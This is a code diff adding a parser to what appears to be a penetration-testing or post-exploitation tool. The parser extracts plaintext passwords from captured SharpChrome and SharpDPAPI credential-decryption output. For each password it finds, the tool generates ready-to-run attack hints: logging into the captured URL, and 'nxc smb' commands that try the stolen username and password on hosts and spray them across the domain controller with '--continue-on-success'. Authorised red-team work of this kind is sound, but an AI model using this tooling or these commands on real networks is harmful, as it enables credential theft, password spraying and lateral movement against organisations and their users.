@@ -8203,6 +8203,96 @@ def _multiline_passes(path, report, store):
                                        source=path, line=_ln(_ps_m),
                                        meta={"format": "get_localgroupmember"}))
 
+    # iter-295: SharpChrome / SharpDPAPI credential decryption captured
+    # output. Both tools emit block-shaped output with plaintext
+    # credentials as the final field after DPAPI unwrapping.
+    #
+    # SharpChrome block (browser Login Data decrypt):
+    #     User         : DESKTOP\alice
+    #     URL          : https://portal.corp.local
+    #     Login        : alice@corp.local
+    #     Password Enc : abcdef...
+    #     Password Dec : SuperSecret123!
+    #
+    # SharpDPAPI cred blob decrypt:
+    #     LastModified : 2/1/2024 ...
+    #     TargetName   : Domain:target=SERVER.CORP.LOCAL
+    #     TargetHost   : SERVER.CORP.LOCAL
+    #     UserName     : svc_backup
+    #     plaintext    : Winter2024!
+    _SHARPCHROME = re.compile(
+        r'(?is)URL\s*:\s*(https?://[^\r\n\s]{4,240})[\s\S]{0,400}?'
+        r'Login\s*:\s*([^\r\n]{1,100}?)\s*[\r\n]+'
+        r'(?:(?!^URL\s*:)[\s\S]){0,300}?'
+        r'Password\s+Dec\s*:\s*([^\r\n]{3,200})')
+    _SHARPDPAPI = re.compile(
+        r'(?is)TargetName\s*:\s*(?:Domain:target=)?([^\r\n]{3,120}?)\s*'
+        r'[\r\n]+(?:(?!^TargetName\s*:)[\s\S]){0,400}?'
+        r'UserName\s*:\s*([^\r\n]{1,80}?)\s*[\r\n]+'
+        r'(?:(?!^TargetName\s*:)[\s\S]){0,300}?'
+        r'plaintext\s*:\s*([^\r\n]{3,200})')
+    if not filters.is_doc_file(path):
+        _sc_seen = set()
+        for _cm in _SHARPCHROME.finditer(text):
+            _url = _cm.group(1).strip()
+            _user = _cm.group(2).strip()
+            _pw = _cm.group(3).strip()
+            if filters.is_placeholder(_pw):
+                continue
+            if _pw.lower() in ("[decryption failed]", "(null)",
+                                "n/a", "-"):
+                continue
+            _sig = (_url[:80], _user.lower())
+            if _sig in _sc_seen:
+                continue
+            _sc_seen.add(_sig)
+            _u_sh = _user.replace("'", "'\\''")
+            _pw_sh = _pw.replace("'", "'\\''")
+            _url_short = _url[:60]
+            report.add("CRITICAL", "CRED PAIRS", path, _ln(_cm),
+                       f"SharpChrome browser cred: {_user} @ "
+                       f"{_url_short} : {_pw}",
+                       hint=(f"try the URL for logon: xdg-open '{_url}'"
+                             f" then submit user/pass  |  if URL is an"
+                             f" internal AD-integrated portal, the "
+                             f"cred may spray same across corp SSO: "
+                             f"nxc smb <dc> -u '{_u_sh}' -p '{_pw_sh}'"))
+            if store is not None:
+                store.add(Evidence(kind="plaintext", user=_user,
+                                   plaintext=_pw,
+                                   source=path, line=_ln(_cm),
+                                   meta={"source": "sharpchrome",
+                                         "url": _url[:200]}))
+        _sd_seen = set()
+        for _dm in _SHARPDPAPI.finditer(text):
+            _tgt = _dm.group(1).strip()
+            _user = _dm.group(2).strip()
+            _pw = _dm.group(3).strip()
+            if filters.is_placeholder(_pw) or _pw.lower() in (
+                    "(null)", "[error]", "n/a", "-"):
+                continue
+            _sig = (_tgt[:80], _user.lower())
+            if _sig in _sd_seen:
+                continue
+            _sd_seen.add(_sig)
+            _u_sh = _user.replace("'", "'\\''")
+            _pw_sh = _pw.replace("'", "'\\''")
+            _tgt_short = _tgt[:60]
+            report.add("CRITICAL", "CRED PAIRS", path, _ln(_dm),
+                       f"SharpDPAPI cred: {_user} @ {_tgt_short} :"
+                       f" {_pw}",
+                       hint=(f"nxc smb '{_tgt_short}' -u '{_u_sh}' "
+                             f"-p '{_pw_sh}'  |  or if TargetHost is "
+                             f"a domain FQDN: nxc smb <dc> -u "
+                             f"'{_u_sh}' -p '{_pw_sh}' --continue-on-"
+                             f"success (spray reuse across domain)"))
+            if store is not None:
+                store.add(Evidence(kind="plaintext", user=_user,
+                                   plaintext=_pw,
+                                   source=path, line=_ln(_dm),
+                                   meta={"source": "sharpdpapi",
+                                         "target": _tgt[:200]}))
+
     # iter-279: PowerView `Get-DomainComputer -Unconstrained | fl` output.
     # `TRUSTED_FOR_DELEGATION` in userAccountControl = unconstrained
     # Kerberos delegation. On DCs it's by design (SERVER_TRUST_ACCOUNT)
